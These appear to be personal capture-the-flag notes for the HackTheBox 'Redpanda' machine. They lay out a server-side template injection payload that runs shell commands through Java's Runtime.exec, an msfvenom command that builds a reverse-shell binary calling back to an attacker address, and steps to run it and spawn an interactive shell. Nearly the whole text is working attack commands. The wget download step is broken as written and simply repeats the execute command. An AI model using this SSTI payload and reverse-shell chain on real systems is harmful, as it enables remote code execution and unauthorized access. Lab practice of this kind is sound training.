# HackTheBox Redpanda machine notes

## SSTI
- For some reason always returning process instead of the command response
- Possible SSTI (POST HTTP endpoint /search) payload = "name='*{ssti}'" (not possible with dollar sign for some reason)

- Not let's remember that $ and _ characters are banned, so we need to use the SSTI-PAYLOAD generator that will encode it to another format
- The payload looks like this: *{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('the command').getInputStream())}


# How to estabilish reverse shell
1. Generate ELF file: msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.8 LPORT=31337 -f elf > r.elf
2. Make the target download the file with wget like this: *{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('./r.elf').getInputStream())}
3. Give every permission to file: *{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('chmod 777 ./r.elf').getInputStream())}
4. Start netcat listener at our host and run the file at target: *{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('./r.elf').getInputStream())}
5. Make an interactive python shell like this: python -c 'import pty; pty.spawn("/bin/sh")'